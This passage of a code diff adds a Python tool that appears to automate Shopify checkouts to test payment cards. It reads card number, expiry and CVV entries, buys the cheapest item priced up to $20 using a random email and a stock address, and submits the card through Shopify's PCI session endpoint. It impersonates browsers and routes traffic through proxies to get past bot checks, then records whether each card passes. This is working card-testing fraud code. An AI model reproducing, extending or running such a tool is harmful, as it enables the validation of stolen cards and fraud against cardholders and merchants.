+    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+    checkout_token = token_match.group(1) if token_match else ""
+    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
+                               checkout_html)
+    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""
+    return checkout_url, checkout_token, session_token, checkout_html
+
+
+# ── Step 2: private access token ─────────────────────────────────────
+
+async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str,
+                                     checkout_url: str, pat_id: str) -> str:
+    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
+    headers = {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "referer": checkout_url,
+        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+    }
+    resp = await client.get(req_url, headers=headers, retry429=2)
+    return f"[{resp.status_code}] {resp.text}"
+
+
+# ── Step 3: actions JS ────────────────────────────────────────────────
+
+async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: str) -> str:
+    headers = {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "origin": shop_url,
+        "priority": "u=1",
+        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "script",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+    }
+    resp = await client.get(actions_url, headers=headers, retry429=2)
+    if resp.status_code != 200:
+        raise Exception(f"GET actions JS returned {resp.status_code}")
+    return resp.text
+
+
+# ── Step 9: PCI session ───────────────────────────────────────────────
+
+async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
+                           card_month: int, card_year: int, cvv: str,
+                           shop_domain: str, proxy_url: str = ""):
+    payload = json.dumps({
+        "credit_card": {
+            "number":             card_number,
+            "month":              card_month,
+            "year":               card_year,
+            "verification_value": cvv,
+            "start_month":        None,
+            "start_year":         None,
+            "issue_number":       "",
+            "name":               card_name,
+        },
+        "payment_session_scope": shop_domain,
+    })
+    headers = {
+        "accept":               "application/json",
+        "accept-language":      "en-US,en;q=0.9",
+        "content-type":         "application/json",
+        "origin":               "https://checkout.pci.shopifyinc.com",
+        "priority":             "u=1, i",
+        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
+        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+        "sec-ch-ua-mobile":     "?0",
+        "sec-ch-ua-platform":   '"Windows"',
+        "sec-fetch-dest":       "empty",
+        "sec-fetch-mode":       "cors",
+        "sec-fetch-site":       "same-origin",
+        "sec-fetch-storage-access": "active",
+        "shopify-identification-signature": ident_sig,
+        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+    }
+    async with AsyncSession(impersonate="chrome124") as session:
+        if proxy_url:
+            session.proxies = {"http": proxy_url, "https": proxy_url}
+        status, body = 0, ""
+        for attempt in range(3):
+            resp = await session.post("https://checkout.pci.shopifyinc.com/sessions",
+                                      data=payload, headers=headers, timeout=12)
+            status, body = resp.status_code, resp.text
+            if 200 <= status < 300:
+                break
+            await asyncio.sleep(1.0 * (attempt + 1) + random.uniform(0, 0.3))
+    return status, body
+
+
+# ── Step 4: Proposal 1 ────────────────────────────────────────────────
+
+async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str,
+                        checkout_token: str, session_token: str, stable_id: str,
+                        variant_id: str, price: str, proposal_id: str,
+                        build_id: str, source_token: str, currency: str, country: str):
+    gql_payload = f'''{{
+  "variables": {{
+    "sessionInput": {{"sessionToken": "{session_token}"}},
+    "queueToken": null,
+    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
+    "delivery": {{
+      "deliveryLines": [{{
+        "destination": {{
+          "partialStreetAddress": {{
+            "address1": "", "city": "", "countryCode": "US",
+            "lastName": "", "phone": "", "oneTimeUse": false
+          }}
+        }},
+        "selectedDeliveryStrategy": {{
+          "deliveryStrategyMatchingConditions": {{
+            "estimatedTimeInTransit": {{"any": true}},
+            "shipments": {{"any": true}}
+          }},
+          "options": {{}}
+        }},
+        "targetMerchandiseLines": {{"any": true}},
+        "deliveryMethodTypes": ["SHIPPING"],
+        "expectedTotalPrice": {{"any": true}},
+        "destinationChanged": true
+      }}],
+      "noDeliveryRequired": [],
+      "useProgressiveRates": false,
+      "prefetchShippingRatesStrategy": null,
+      "supportsSplitShipping": true
+    }},
+    "deliveryExpectations": {{"deliveryExpectationLines": []}},
+    "merchandise": {{
+      "merchandiseLines": [{{
+        "stableId": "{stable_id}",
+        "merchandise": {{
+          "productVariantReference": {{
+            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
+            "variantId": "gid://shopify/ProductVariant/{variant_id}",
+            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
+          }}
+        }},
+        "quantity": {{"items": {{"value": 1}}}},
+        "expectedTotalPrice": {{"any": true}},
+        "lineComponentsSource": null, "lineComponents": []
+      }}]
+    }},
+    "memberships": {{"memberships": []}},
+    "payment": {{
+      "totalAmount": {{"any": true}},
+      "paymentLines": [],
+      "billingAddress": {{
+        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
+      }}
+    }},
+    "buyerIdentity": {{
+      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "phoneCountryCode": "US",
+      "marketingConsent": [],
+      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "rememberMe": false
+    }},
+    "tip": {{"tipLines": []}},
+    "poNumber": null,
+    "taxes": {{
+      "proposedAllocations": null,
+      "proposedTotalAmount": {{"any": true}},
+      "proposedTotalIncludedAmount": null,
+      "proposedMixedStateTotalAmount": null,
+      "proposedExemptions": []
+    }},
+    "note": {{"message": null, "customAttributes": []}},
+    "localizationExtension": {{"fields": []}},
+    "nonNegotiableTerms": null,
+    "scriptFingerprint": {{
+      "signature": null, "signatureUuid": null,
+      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
+    }},
+    "optionalDuties": {{"buyerRefusesDuties": false}},
+    "cartMetafields": []
+  }},
+  "operationName": "Proposal",
+  "id": "{proposal_id}"
+}}'''
+    gql_payload = patch_payload(gql_payload, currency, country)
+    resp = await client.post(
+        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
+        data=gql_payload, retry429=2,
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
+                                  session_token, build_id, source_token),
+    )
+    return resp.status_code, resp.text
+
+
+# ── Step 5: Proposal 2 (email) ────────────────────────────────────────
+
+async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: str,
+                         checkout_token: str, session_token: str, stable_id: str,
+                         variant_id: str, price: str, proposal_id: str,
+                         build_id: str, source_token: str, queue_token: str,
+                         email: str, currency: str, country: str):
+    gql_payload = f'''{{
+  "variables": {{
+    "sessionInput": {{"sessionToken": "{session_token}"}},
+    "queueToken": "{queue_token}",
+    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
+    "delivery": {{
+      "deliveryLines": [{{
+        "destination": {{
+          "partialStreetAddress": {{
+            "address1": "", "city": "", "countryCode": "US",
+            "lastName": "", "phone": "", "oneTimeUse": false
+          }}
+        }},
+        "selectedDeliveryStrategy": {{
+          "deliveryStrategyMatchingConditions": {{
+            "estimatedTimeInTransit": {{"any": true}},
+            "shipments": {{"any": true}}
+          }},
+          "options": {{}}
+        }},
+        "targetMerchandiseLines": {{"any": true}},
+        "deliveryMethodTypes": ["SHIPPING"],
+        "expectedTotalPrice": {{"any": true}},
+        "destinationChanged": true
+      }}],
+      "noDeliveryRequired": [],
+      "useProgressiveRates": false,
+      "prefetchShippingRatesStrategy": null,
+      "supportsSplitShipping": true
+    }},
+    "deliveryExpectations": {{"deliveryExpectationLines": []}},
+    "merchandise": {{
+      "merchandiseLines": [{{
+        "stableId": "{stable_id}",
+        "merchandise": {{
+          "productVariantReference": {{
+            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
+            "variantId": "gid://shopify/ProductVariant/{variant_id}",
+            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
+          }}
+        }},
+        "quantity": {{"items": {{"value": 1}}}},
+        "expectedTotalPrice": {{"any": true}},
+        "lineComponentsSource": null, "lineComponents": []
+      }}]
+    }},
+    "memberships": {{"memberships": []}},
+    "payment": {{
+      "totalAmount": {{"any": true}},
+      "paymentLines": [],
+      "billingAddress": {{
+        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
+      }}
+    }},
+    "buyerIdentity": {{
+      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "email": "{email}",
+      "emailChanged": true,
+      "phoneCountryCode": "US",
+      "marketingConsent": [],
+      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "rememberMe": false
+    }},
+    "tip": {{"tipLines": []}},
+    "poNumber": null,
+    "taxes": {{
+      "proposedAllocations": null,
+      "proposedTotalAmount": {{"any": true}},
+      "proposedTotalIncludedAmount": null,
+      "proposedMixedStateTotalAmount": null,
+      "proposedExemptions": []
+    }},
+    "note": {{"message": null, "customAttributes": []}},
+    "localizationExtension": {{"fields": []}},
+    "nonNegotiableTerms": null,
+    "scriptFingerprint": {{
+      "signature": null, "signatureUuid": null,
+      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
+    }},
+    "optionalDuties": {{"buyerRefusesDuties": false}},
+    "cartMetafields": []
+  }},
+  "operationName": "Proposal",
+  "id": "{proposal_id}"
+}}'''
+    gql_payload = patch_payload(gql_payload, currency, country)
+    resp = await client.post(
+        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
+        data=gql_payload, retry429=2,
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
+                                  session_token, build_id, source_token),
+    )
+    return resp.status_code, resp.text
+
+
+# ── Step 6/7/8: Proposal 3 (address) ─────────────────────────────────
+
+async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: str,
+                         checkout_token: str, session_token: str, stable_id: str,
+                         variant_id: str, price: str, proposal_id: str,
+                         build_id: str, source_token: str, queue_token: str,
+                         email: str, addr: Address, currency: str, country: str):
+    gql_payload = f'''{{
+  "variables": {{
+    "sessionInput": {{"sessionToken": "{session_token}"}},
+    "queueToken": "{queue_token}",
+    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
+    "delivery": {{
+      "deliveryLines": [{{
+        "destination": {{
+          "partialStreetAddress": {{
+            "address1": "{addr.address1}",
+            "address2": "{addr.address2}",
+            "city": "{addr.city}",
+            "countryCode": "{addr.country_code}",
+            "postalCode": "{addr.postal_code}",
+            "firstName": "{addr.first_name}",
+            "lastName": "{addr.last_name}",
+            "zoneCode": "{addr.zone_code}",
+            "phone": "{addr.phone}",
+            "oneTimeUse": false
+          }}
+        }},
+        "selectedDeliveryStrategy": {{
+          "deliveryStrategyMatchingConditions": {{
+            "estimatedTimeInTransit": {{"any": true}},
+            "shipments": {{"any": true}}
+          }},
+          "options": {{}}
+        }},
+        "targetMerchandiseLines": {{"any": true}},
+        "deliveryMethodTypes": ["SHIPPING"],
+        "expectedTotalPrice": {{"any": true}},
+        "destinationChanged": true
+      }}],
+      "noDeliveryRequired": [],
+      "useProgressiveRates": false,
+      "prefetchShippingRatesStrategy": null,
+      "supportsSplitShipping": true
+    }},
+    "deliveryExpectations": {{"deliveryExpectationLines": []}},
+    "merchandise": {{
+      "merchandiseLines": [{{
+        "stableId": "{stable_id}",
+        "merchandise": {{
+          "productVariantReference": {{
+            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
+            "variantId": "gid://shopify/ProductVariant/{variant_id}",
+            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
+          }}
+        }},
+        "quantity": {{"items": {{"value": 1}}}},
+        "expectedTotalPrice": {{"any": true}},
+        "lineComponentsSource": null, "lineComponents": []
+      }}]
+    }},
+    "memberships": {{"memberships": []}},
+    "payment": {{
+      "totalAmount": {{"any": true}},
+      "paymentLines": [],
+      "billingAddress": {{
+        "streetAddress": {{
+          "address1": "{addr.address1}",
+          "address2": "{addr.address2}",
+          "city": "{addr.city}",
+          "countryCode": "{addr.country_code}",
+          "postalCode": "{addr.postal_code}",
+          "firstName": "{addr.first_name}",
+          "lastName": "{addr.last_name}",
+          "zoneCode": "{addr.zone_code}",
+          "phone": "{addr.phone}"
+        }}
+      }}
+    }},
+    "buyerIdentity": {{
+      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "email": "{email}",
+      "emailChanged": false,
+      "phoneCountryCode": "US",
+      "marketingConsent": [],
+      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "rememberMe": false
+    }},
+    "tip": {{"tipLines": []}},
+    "poNumber": null,
+    "taxes": {{
+      "proposedAllocations": null,
+      "proposedTotalAmount": {{"any": true}},
+      "proposedTotalIncludedAmount": null,
+      "proposedMixedStateTotalAmount": null,
+      "proposedExemptions": []
+    }},
+    "note": {{"message": null, "customAttributes": []}},
+    "localizationExtension": {{"fields": []}},
+    "nonNegotiableTerms": null,
+    "scriptFingerprint": {{
+      "signature": null, "signatureUuid": null,
+      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
+    }},
+    "optionalDuties": {{"buyerRefusesDuties": false}},
+    "cartMetafields": []
+  }},
+  "operationName": "Proposal",
+  "id": "{proposal_id}"
+}}'''
+    gql_payload = patch_payload(gql_payload, currency, country)
+    resp = await client.post(
+        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
+        data=gql_payload, retry429=2,
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
+                                  session_token, build_id, source_token),
+    )
+    return resp.status_code, resp.text
+
+
+# ── Step 10a: poll for receipt ────────────────────────────────────────
+
+async def send_poll_for_receipt(client: AsyncTLSClient, shop_url: str, checkout_url: str,
+                                checkout_token: str, session_token: str, build_id: str,
+                                source_token: str, poll_id: str, receipt_id: str,
+                                receipt_session_token: str):
+    params   = {
+        "operationName": "PollForReceipt",
+        "variables":     json.dumps({"receiptId": receipt_id,
+                                     "sessionToken": receipt_session_token}),
+        "id":            poll_id,
+    }
+    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
+    headers  = _proposal_headers(shop_url, checkout_url, checkout_token,
+                                 session_token, build_id, source_token)
+    headers["x-checkout-web-source-id"] = checkout_token
+    resp = await client.get(full_url, headers=headers)
+    return resp.status_code, resp.text
+
+
+# ── Step 10b: submit for completion ──────────────────────────────────
+
+async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
+                                     checkout_url: str, checkout_token: str,
+                                     session_token: str, stable_id: str, variant_id: str,
+                                     price: str, submit_id: str, build_id: str,
+                                     source_token: str, queue_token: str, email: str,
+                                     addr: Address, delivery_handle: str, shipping_amount: str,
+                                     total_amount: str, pci_session_id: str, attempt_token: str,
+                                     currency: str, country: str, signed_handles,
+                                     is_digital: bool = False, tax_amount: str = None,
+                                     total_any: bool = False,
+                                     payment_flex_terms_id: str = None) -> tuple:
+    handle_lines        = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
+    signed_handles_json = "[" + ",".join(handle_lines) + "]"
+    page_id             = generate_page_id()
+
+    if is_digital or total_any:
+        total_amount_block = '"totalAmount": {"any": true}'
+    else:
+        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'
+
+    if is_digital or total_any:
+        amount_line = '"amount": {"any": true}'
+    else:
+        amount_line = f'"amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'
+
+    if payment_flex_terms_id:
+        flex_block = (f'"paymentFlexibilityTerms": '
+                      f'[{{"paymentTermsTemplateId": "{payment_flex_terms_id}"}}],')
+    else:
+        flex_block = ""
+
+    if is_digital:
+        delivery_block = f'''
+      "delivery": {{
+        "deliveryLines": [{{
+          "selectedDeliveryStrategy": {{
+            "deliveryStrategyMatchingConditions": {{
+              "estimatedTimeInTransit": {{"any": true}},
+              "shipments": {{"any": true}}
+            }},
+            "options": {{}}
+          }},
+          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
+          "deliveryMethodTypes": ["NONE"],
+          "expectedTotalPrice": {{"any": true}},
+          "destinationChanged": true
+        }}],
+        "noDeliveryRequired": [],
+        "useProgressiveRates": false,
+        "prefetchShippingRatesStrategy": null,
+        "supportsSplitShipping": true
+      }},
+      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
+    else:
+        delivery_block = f'''
+      "delivery": {{
+        "deliveryLines": [{{
+          "destination": {{
+            "streetAddress": {{
+              "address1": "{addr.address1}",
+              "address2": "{addr.address2}",
+              "city": "{addr.city}",
+              "countryCode": "{addr.country_code}",
+              "postalCode": "{addr.postal_code}",
+              "firstName": "{addr.first_name}",
+              "lastName": "{addr.last_name}",
+              "zoneCode": "{addr.zone_code}",
+              "phone": "{addr.phone}",
+              "oneTimeUse": false
+            }}
+          }},
+          "selectedDeliveryStrategy": {{
+            "deliveryStrategyByHandle": {{
+              "handle": "{delivery_handle}",
+              "customDeliveryRate": false
+            }},
+            "options": {{}}
+          }},
+          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
+          "deliveryMethodTypes": ["SHIPPING"],
+          "expectedTotalPrice": {{"any": true}},
+          "destinationChanged": false
+        }}],
+        "noDeliveryRequired": [],
+        "useProgressiveRates": false,
+        "prefetchShippingRatesStrategy": null,
+        "supportsSplitShipping": true
+      }},
+      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''
+
+    tax_val   = tax_amount or "0.0"
+    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'
+
+    gql_payload = f'''{{
+  "variables": {{
+    "input": {{
+      "sessionInput": {{"sessionToken": "{session_token}"}},
+      "queueToken": "{queue_token}",
+      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
+      {delivery_block},
+      "merchandise": {{
+        "merchandiseLines": [{{
+          "stableId": "{stable_id}",
+          "merchandise": {{
+            "productVariantReference": {{
+              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
+              "variantId": "gid://shopify/ProductVariant/{variant_id}",
+              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
+            }}
+          }},
+          "quantity": {{"items": {{"value": 1}}}},
+          "expectedTotalPrice": {{"any": true}},
+          "lineComponentsSource": null, "lineComponents": []
+        }}]
+      }},
+      "memberships": {{"memberships": []}},
+      "payment": {{
+        {total_amount_block},
+        {flex_block}
+        "paymentLines": [{{
+          "paymentMethod": {{
+            "directPaymentMethod": {{
+              "sessionId": "{pci_session_id}",
+              "billingAddress": {{
+                "streetAddress": {{
+                  "address1": "{addr.address1}",
+                  "address2": "{addr.address2}",
+                  "city": "{addr.city}",
+                  "countryCode": "{addr.country_code}",
+                  "postalCode": "{addr.postal_code}",
+                  "firstName": "{addr.first_name}",
+                  "lastName": "{addr.last_name}",
+                  "zoneCode": "{addr.zone_code}",
+                  "phone": "{addr.phone}"
+                }}
+              }},
+              "cardSource": null
+            }},
+            "giftCardPaymentMethod": null,
+            "redeemablePaymentMethod": null,
+            "walletPaymentMethod": null,
+            "walletsPlatformPaymentMethod": null,
+            "localPaymentMethod": null,
+            "paymentOnDeliveryMethod": null,
+            "paymentOnDeliveryMethod2": null,
+            "manualPaymentMethod": null,
+            "customPaymentMethod": null,
+            "offsitePaymentMethod": null,
+            "customOnsitePaymentMethod": null,
+            "deferredPaymentMethod": null,
+            "customerCreditCardPaymentMethod": null,
+            "paypalBillingAgreementPaymentMethod": null,
+            "remotePaymentInstrument": null
+          }},
+          {amount_line}
+        }}],
+        "billingAddress": {{
+          "streetAddress": {{
+            "address1": "{addr.address1}",
+            "address2": "{addr.address2}",
+            "city": "{addr.city}",
+            "countryCode": "{addr.country_code}",
+            "postalCode": "{addr.postal_code}",
+            "firstName": "{addr.first_name}",
+            "lastName": "{addr.last_name}",
+            "zoneCode": "{addr.zone_code}",
+            "phone": "{addr.phone}"
+          }}
+        }}
+      }},
+      "buyerIdentity": {{
+        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+        "email": "{email}",
+        "emailChanged": false,
+        "phoneCountryCode": "US",
+        "marketingConsent": [],
+        "shopPayOptInPhone": {{"countryCode": "US"}},
+        "rememberMe": false
+      }},
+      "tip": {{"tipLines": []}},
+      "poNumber": null,
+      "taxes": {{
+        "proposedAllocations": null,
+        {tax_block},
+        "proposedTotalIncludedAmount": null,
+        "proposedMixedStateTotalAmount": null,
+        "proposedExemptions": []
+      }},
+      "note": {{"message": null, "customAttributes": []}},
+      "localizationExtension": {{"fields": []}},
+      "nonNegotiableTerms": null,
+      "scriptFingerprint": {{
+        "signature": null, "signatureUuid": null,
+        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
+      }},
+      "optionalDuties": {{"buyerRefusesDuties": false}},
+      "cartMetafields": []
+    }},
+    "attemptToken": "{attempt_token}",
+    "metafields": [],
+    "analytics": {{
+      "requestUrl": "{checkout_url}",
+      "pageId": "{page_id}"
+    }}
+  }},
+  "operationName": "SubmitForCompletion",
+  "id": "{submit_id}"
+}}'''
+    gql_payload = patch_payload(gql_payload, currency, country)
+    resp = await client.post(
+        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
+        data=gql_payload, retry429=2,
+        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
+                                  session_token, build_id, source_token),
+    )
+    return resp.status_code, resp.text
+
+
+# ── Main async checkout orchestrator ─────────────────────────────────
+
+async def proposal5_for_address_async(client: AsyncTLSClient, shop_url: str, checkout_url: str,
+                                      checkout_token: str, session_token: str, stable_id: str,
+                                      variant_id: str, price: str, proposal_id: str, build_id: str,
+                                      source_token: str, addr_queue_token: str, email: str,
+                                      addr: Address, currency: str, country: str) -> Tuple[str, Address]:
+    _, p3_body = await send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
+                                       stable_id, variant_id, price, proposal_id, build_id, source_token,
+                                       addr_queue_token, email, addr, currency, country)
+    q3 = extract_queue_token(p3_body)
+    if not q3:
+        raise Exception("fallback address: no queueToken after proposal3")
+    _, p4_body = await send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
+                                       stable_id, variant_id, price, proposal_id, build_id, source_token,
+                                       q3, email, addr, currency, country)
+    q4 = extract_queue_token(p4_body)
+    if not q4:
+        raise Exception("fallback address: no queueToken after proposal4")
+    _, p5_body = await send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
+                                       stable_id, variant_id, price, proposal_id, build_id, source_token,
+                                       q4, email, addr, currency, country)
+    return p5_body, addr
+
+
+async def _run_checkout_once_async(shop_url: str, card_entry: str,
+                                   proxy_url: str = "", exclude=None) -> CheckResult:
+    currency  = "USD"
+    country   = "US"
+    site_name = shop_url.replace("https://", "").replace("http://", "")
+
+    result = CheckResult(card=card_entry, shop_url=shop_url,
+                         site_name=site_name, currency=currency,
+                         status=CheckStatus.ERROR)
+    try:
+        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
+    except Exception as e:
+        result.error = e
+        return result
+
+    email       = generate_random_email()
+
+    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url)
+    try:
+        currency, country = await fetch_shop_currency(client, shop_url)
+        result.currency = currency
+        # Step 0 - Find cheapest product (0.01$ to 20$): all pages in parallel
+        try:
+            title, product_id, product_handle, variant_id, price = await find_cheapest_product(
+                client, shop_url, exclude=exclude
+            )
+            _ = title
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.retryable = True
+            result.error = Exception(f"Step 0 failed: {e}")
+            return result
+        result.picked_variant_id = str(variant_id)
+        result.picked_product_id = str(product_id)
+
+        # Step 1
+        try:
+            checkout_url, checkout_token, session_token, checkout_html = \
+                await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
+            stable_id    = extract_stable_id(checkout_html)
+            build_id     = extract_commit_sha(checkout_html)
+            source_token = extract_source_token(checkout_html)
+            if not stable_id or not build_id or not source_token:
+                try:
+                    await client.close()
+                except Exception:
+                    pass
+                client = AsyncTLSClient(timeout=12, proxy_url=proxy_url)
+                checkout_url, checkout_token, session_token, checkout_html = \
+                    await add_to_cart_and_checkout(client, shop_url, variant_id, product_id, product_handle)
+                stable_id    = extract_stable_id(checkout_html)
+                build_id     = extract_commit_sha(checkout_html)
+                source_token = extract_source_token(checkout_html)
+            if not stable_id or not build_id or not source_token:
+                try:
+                    import os as _os
+                    with open("/tmp/dump_s1_%d.json" % _os.getpid(), "w") as _df:
+                        _df.write(checkout_html or "")
+                except Exception:
+                    pass
+                raise Exception("missing stableId, buildId, or sourceToken")
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.retryable = "CF_MANAGED_CHALLENGE" not in str(e)
+            result.error = Exception(f"Step 1 failed: {e}")
+            return result
+
+        # Step 2
+        try:
+            pat_id = extract_private_access_token_id(checkout_html)
+            if not pat_id:
+                raise Exception("could not extract private_access_token id")
+            await fetch_private_access_token(client, shop_url, checkout_url, pat_id)
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.retryable = True
+            result.error = Exception(f"Step 2 failed: {e}")
+            return result
+
+        # Step 3
+        try:
+            actions_url = extract_actions_js_url(checkout_html, shop_url)
+            if not actions_url:
+                raise Exception("could not find actions JS URL")
+            js_body     = await fetch_actions_js(client, actions_url, shop_url)
+            proposal_id = extract_proposal_id(js_body)
+            submit_id   = extract_submit_for_completion_id(js_body)
+            if not proposal_id or not submit_id:
+                raise Exception("missing Proposal or Submit ID")
+            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.retryable = True
+            result.error = Exception(f"Step 3 failed: {e}")
+            return result
+
+        # Step 4
+        try:
+            _, proposal_body = await send_proposal(
+                client, shop_url, checkout_url, checkout_token, session_token,
+                stable_id, variant_id, price, proposal_id, build_id, source_token,
+                currency, country)
+            cur = extract_seller_currency(proposal_body)
+            if cur and cur != currency:
+                currency = cur
+            ctr = extract_seller_country(proposal_body)
+            if ctr and ctr != country:
+                country = ctr
+            result.currency = currency
+            if not result.gateway:
+                result.gateway = extract_gateway_name(proposal_body)
+            if currency == "USD":
+                sp = extract_seller_merchandise_price(proposal_body)
+                if sp and sp != price:
+                    price = sp
+            queue_token = extract_queue_token(proposal_body)
+            if not queue_token:
+                raise Exception("could not extract queueToken")
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.error = Exception(f"Step 4 failed: {e}")
+            return result
+
+        # Step 5
+        try:
+            _, proposal2_body = await send_proposal2(
+                client, shop_url, checkout_url, checkout_token, session_token,
+                stable_id, variant_id, price, proposal_id, build_id, source_token,
+                queue_token, email, currency, country)
+            queue_token2 = extract_queue_token(proposal2_body)
+            if not queue_token2:
+                raise Exception("could not extract queueToken")
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.error = Exception(f"Step 5 failed: {e}")
+            return result
+
+        # Step 6
+        try:
+            addr = address_for_country(country)
+            _, proposal3_body = await send_proposal3(
+                client, shop_url, checkout_url, checkout_token, session_token,
+                stable_id, variant_id, price, proposal_id, build_id, source_token,
+                queue_token2, email, addr, currency, country)
+            queue_token3 = extract_queue_token(proposal3_body)
+            if not queue_token3:
+                raise Exception("could not extract queueToken")
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.error = Exception(f"Step 6 failed: {e}")
+            return result
+
+        # Step 7
+        try:
+            _, proposal4_body = await send_proposal3(
+                client, shop_url, checkout_url, checkout_token, session_token,
+                stable_id, variant_id, price, proposal_id, build_id, source_token,
+                queue_token3, email, addr, currency, country)
+            queue_token4 = extract_queue_token(proposal4_body)
+            if not queue_token4:
+                raise Exception("could not extract queueToken")
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.error = Exception(f"Step 7 failed: {e}")
+            return result
+
+        # Step 8
+        try:
+            proposal5_status, proposal5_body = await send_proposal3(
+                client, shop_url, checkout_url, checkout_token, session_token,
+                stable_id, variant_id, price, proposal_id, build_id, source_token,
+                queue_token4, email, addr, currency, country)
+            _ = proposal5_status
+        except Exception as e:
+            result.status = CheckStatus.ERROR
+            result.error = Exception(f"Step 8 failed: {e}")
+            return result
+
+        # Step 9
+        try:
+            ident_sig = extract_identification_signature(checkout_html)
+            if not ident_sig:
+                raise Exception("could not extract identification signature")
+            pci_status, pci_body = await send_pci_session(
+                ident_sig, card_number,
+                f"{addr.first_name} {addr.last_name}",
+                card_month, card_year, card_cvv, site_name, proxy_url)
+            _ = pci_status
+            pci_session_id = extract_pci_session_id(pci_body)
+            if not pci_session_id:
+                result.retryable = True
+                raise Exception("could not extract session ID")
+        except Exception as e:
